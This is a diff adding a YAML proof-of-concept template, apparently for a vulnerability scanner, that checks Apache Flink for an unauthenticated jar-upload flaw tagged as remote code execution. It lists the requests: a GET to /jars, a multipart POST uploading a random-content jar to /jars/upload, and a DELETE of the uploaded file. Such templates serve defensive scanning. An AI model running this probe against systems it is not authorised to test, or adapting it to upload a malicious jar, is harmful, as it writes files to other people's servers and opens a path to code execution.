@@ -1,0 +1,54 @@
+id: poc-yaml-apache-flink-upload-rce
+info:
+  name: Apache Flink Upload 远程代码执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: Apache Flink
+  reference: []
+  description: null
+variables:
+  r1: random_str(8)
+  r2: random_str(4)
+transport: http
+requests:
+- method: GET
+  path: /jars
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "json") && contains(body, "address") && contains(body, "files")
+  output: []
+- method: POST
+  path: /jars/upload
+  headers:
+    Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+  data: '--8ce4b16b22b58894aa86c421e8759df3
+
+    Content-Disposition: form-data; name="jarfile";filename="{{.r2}}.jar"
+
+    Content-Type:application/octet-stream
+
+
+    {{.r1}}
+
+    --8ce4b16b22b58894aa86c421e8759df3--'
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "json") && contains(body, "success") && contains(body, r2)
+  output:
+  - regex_match(body,"(?P<filen>([a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}_[a-z]{4}.jar))")
+- method: DELETE
+  path: /jars/{{.filen}}
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output: []
